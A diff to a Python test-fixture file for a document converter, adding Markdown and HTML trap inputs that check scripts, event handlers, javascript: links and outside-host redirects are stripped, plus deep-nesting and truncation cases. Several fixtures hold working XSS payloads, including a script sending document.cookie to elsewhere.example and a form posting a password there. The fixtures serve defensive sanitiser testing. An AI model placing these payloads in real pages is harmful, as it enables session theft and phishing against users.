@@ -537,8 +537,12 @@ trap(
 trap(
     "html-named.svg",
     b"<!DOCTYPE html>\n<html><body><svg></svg><script>alert(1)</script></body></html>\n",
-    "A web page with an .svg name. Its root is not <svg>, so it is not an SVG.",
-    "unknown",
+    "A web page with an .svg name. Its root is not <svg>, so it is not an SVG: it is a web "
+    "page, and one with a script and no words in it.",
+    "html",
+    node="fails",
+    mismatch=True,
+    note="This file has no text in it to convert",
     group=G,
 )
 
@@ -1044,8 +1048,11 @@ trap(
 trap(
     "web-page.xml",
     b"<!DOCTYPE html>\n<html><head><title>x</title></head><body><p>Hello<br>there</body></html>\n",
-    "A web page with an .xml name. It begins with a tag, as XML does, and is not data.",
-    "unknown",
+    "A web page with an .xml name. It begins with a tag, as XML does, and is not data: it is "
+    "converted as the web page it is.",
+    "html",
+    node="succeeds",
+    mismatch=True,
     group=G,
 )
 
@@ -1579,6 +1586,198 @@ sub(
     "web-page-named.smi",
     b"<!DOCTYPE html>\n<html><body><p>Hello</p></body></html>\n",
     "A web page with a .smi name. SAMI looks like one, and is not one.",
+    "html", node="succeeds", mismatch=True,
+)
+
+# --- text: Markdown and HTML ----------------------------------------------------------------------
+# Both can carry things that run when the result is opened: scripts, handlers, links that are
+# code, pages loaded from elsewhere. Both can be nested without limit. And Markdown has no
+# invalid form at all, so the question for it is never "is this valid" but "what did it let
+# through". Each is converted to the other.
+G = "text"
+NO_TEXT = "This file has no text in it to convert"
+TOO_DEEP = "This file is nested too deeply to convert"
+
+
+def text(name, data, why, detect, **more):
+    trap(name, data, why, detect, group=G, **more)
+
+
+text(
+    "script-in-markdown.md",
+    b"# Notes\n\nHello.\n\n<script>fetch('http://elsewhere.example/'+document.cookie)</script>\n\n"
+    b"<img src=x onerror=\"alert(1)\">\n\n<svg onload=alert(2)></svg>\n\n<b onmouseover=alert(3)>bold</b>\n",
+    "Markdown may hold HTML, and this holds a script, a picture and a drawing that run code "
+    "when they load, and a word that runs code when pointed at. The words are kept; nothing "
+    "that could run is.",
+    "md", node="succeeds", absent="alert(",
+)
+text(
+    "links-that-are-code.md",
+    b"# Links\n\n[click me](javascript:alert(1)) and [me](JaVaScRiPt:alert(2)) and "
+    b"[me too](&#106;avascript:alert(3)) and ![a picture](javascript:alert(4)) and "
+    b"[a page](data:text/html;base64,PHNjcmlwdD5hbGVydCg1KTwvc2NyaXB0Pg==) and "
+    b"<a href=\"vbscript:alert(6)\">an old one</a>.\n",
+    "Six links that run code when followed, spelled six ways. Each keeps its words and "
+    "loses its address.",
+    "md", node="succeeds", absent="alert(",
+)
+text(
+    "title-breaks-out.md",
+    b"# </title><script>alert(1)</script><title>\n\nWords.\n",
+    "A heading written to close the page's title early and start a script after it.",
+    "md", node="succeeds", absent="<script",
+)
+text(
+    "page-takes-over.md",
+    b"# Welcome\n\n<meta http-equiv=\"refresh\" content=\"0;url=http://elsewhere.example/\">\n\n"
+    b"<base href=\"http://elsewhere.example/\">\n\n<link rel=\"stylesheet\" href=\"http://elsewhere.example/x.css\">\n\n"
+    b"<form action=\"http://elsewhere.example/steal\"><input name=\"password\"><button>Sign in</button></form>\n\n"
+    b"<iframe src=\"http://elsewhere.example/\"></iframe>\n\n<object data=\"http://elsewhere.example/x.swf\"></object>\n",
+    "HTML inside Markdown that would send the reader to another site, load its styles, frame "
+    "it, and post a password to it. None of it is written to the page.",
+    "md", node="succeeds", absent="elsewhere.example",
+)
+text(
+    "quotes-ten-thousand-deep.md",
+    b">" * 10_000 + b" deep\n",
+    "One word inside ten thousand quotations, each inside the last.",
+    "md", node="fails", note=TOO_DEEP,
+)
+text(
+    "lists-a-thousand-deep.md",
+    b"".join(b" " * (2 * i) + b"- level\n" for i in range(1000)),
+    "A list inside a list, a thousand times over. Read in full it takes most of a minute; it "
+    "is refused before reading starts.",
+    "md", node="fails", note=TOO_DEEP,
+)
+text(
+    "brackets-never-closed.md",
+    b"[" * 50_000 + b"\n",
+    "Fifty thousand opening brackets. Each could begin a link, and none does.",
+    "md", node="succeeds",
+)
+text(
+    "emphasis-never-closed.md",
+    b"*a _b " * 20_000 + b"\n",
+    "Forty thousand marks that open emphasis and none that closes it.",
+    "md", node="succeeds",
+)
+text(
+    "truncated.md",
+    b"# Report\n\n| Name | Born |\n| ---- | --\n\n```js\nconst unfinished = [1, 2,\n\nSee [the rest](http",
+    "Markdown that stops mid-table, mid-code and mid-link. Markdown has no invalid form, so "
+    "this converts as far as it goes.",
+    "md", node="succeeds",
+)
+text(
+    "only-a-comment.md",
+    b"<!-- nothing to see -->\n\n<!-- nor here -->\n",
+    "Markdown holding comments and no words.",
+    "md", node="fails", note=NO_TEXT,
+)
+text(
+    "picture-named.md",
+    GOOD,
+    "A PNG with an .md name. A name can say that text is Markdown; it cannot make text of a "
+    "picture.",
+    "png", node="succeeds", mismatch=True,
+)
+text(
+    "latin-1.md",
+    "# Résumé\n\nZoë, déjà vu.\n".encode("latin-1"),
+    "Markdown saved in an older encoding.",
+    "unknown",
+)
+text(
+    "zero-bytes-inside.md",
+    b"# Title\n\nHel\x00lo\x00\n",
+    "Markdown with zero bytes among the words, which no text file holds.",
+    "unknown",
+)
+text(
+    "nothing-inside.md",
+    b"",
+    "A file with a Markdown name and no bytes at all.",
+    "unknown",
+)
+
+text(
+    "truncated.html",
+    b"<!doctype html>\n<html><body><h1>Report</h1><p>The first paragraph.</p><table><tr><td>cell</td><td cla",
+    "A web page that stops in the middle of a tag. Browsers show what there is, and so does "
+    "this: the words that arrived are kept.",
+    "html", node="succeeds", absent="cla",
+)
+text(
+    "nested-ten-thousand-deep.html",
+    b"<!doctype html>\n<html><body>" + b"<div>" * 10_000 + b"deep" + b"</div>" * 10_000 + b"</body></html>\n",
+    "One word inside ten thousand boxes, each inside the last: enough to exhaust a reader "
+    "that goes one level deeper for every tag.",
+    "html", node="fails", note=TOO_DEEP,
+)
+text(
+    "nothing-but-scripts.html",
+    b"<!doctype html>\n<html><head><script>track()</script><style>body{display:none}</style></head>"
+    b"<body><script>document.write('<h1>Hello</h1>')</script><noscript>Turn on JavaScript</noscript></body></html>\n",
+    "A page whose words are all written by a script when it runs. Nothing here runs, so there "
+    "are no words.",
+    "html", node="fails", note=NO_TEXT,
+)
+text(
+    "everything-that-runs.html",
+    b"<!doctype html>\n<html><body onload=\"alert(1)\"><h1 onclick=\"alert(2)\">Title</h1>"
+    b"<p><a href=\"javascript:alert(3)\">a link</a> <img src=\"x\" onerror=\"alert(4)\" alt=\"a picture\">"
+    b"<svg><script>alert(5)</script></svg><math><maction actiontype=\"statusline#alert(6)\">x</maction></math>"
+    b"<iframe srcdoc=\"<script>alert(7)</script>\"></iframe><embed src=\"javascript:alert(8)\">"
+    b"<a href=\" &#14; javascript:alert(9)\">another</a></p></body></html>\n",
+    "A page with code in nine places a browser would run it from. The Markdown keeps the "
+    "heading, the link's words and the picture's description.",
+    "html", node="succeeds", absent="alert(",
+)
+text(
+    "hidden-words.html",
+    b"<!doctype html>\n<html><head><title>NOT-CONTENT-1</title><style>.x::after{content:'NOT-CONTENT-2'}</style></head>"
+    b"<body><p>Shown.</p><template><p>NOT-CONTENT-3</p></template><script type=\"application/json\">{\"k\":\"NOT-CONTENT-4\"}</script></body></html>\n",
+    "Text in a page's title, styles, template and embedded data: none of it is what the page "
+    "says to a reader, and none of it is written out as if it were.",
+    "html", node="succeeds", absent="NOT-CONTENT",
+)
+text(
+    "doctype-and-nothing-else.html",
+    b"<!doctype html>\n",
+    "The line that opens a web page, and no page.",
+    "html", node="fails", note=NO_TEXT,
+)
+text(
+    "a-hundred-thousand-attributes.html",
+    b"<!doctype html>\n<html><body><p " + b"".join(b"a%d=1 " % i for i in range(100_000)) + b">Words.</p></body></html>\n",
+    "One paragraph with a hundred thousand attributes on it.",
+    "html", node="succeeds", absent="a99999",
+)
+text(
+    "comments-never-closed.html",
+    b"<!doctype html>\n<html><body><p>Words.</p>" + b"<!--" * 50_000 + b"\n",
+    "Fifty thousand comments opened and none closed, after the words.",
+    "html", node="succeeds", absent="<!--",
+)
+text(
+    "page-named.json",
+    b"<!doctype html>\n<html><body><h1>Not data</h1><p>A page.</p></body></html>\n",
+    "A web page with a .json name.",
+    "html", node="succeeds", mismatch=True,
+)
+text(
+    "piece-of-a-page.html",
+    b"<h1>No page around it</h1>\n<p>A heading and a paragraph, with no html or body tag.</p>\n",
+    "A piece of a page with nothing around it. Unnamed it would read as XML; its name says "
+    "what it is.",
+    "html", node="succeeds",
+)
+text(
+    "utf-16.html",
+    b"\xff\xfe" + "<!doctype html>\n<html><body><p>Hello</p></body></html>\n".encode("utf-16-le"),
+    "A web page saved as UTF-16, two bytes to a letter, which Omsett does not read.",
     "unknown",
 )
 
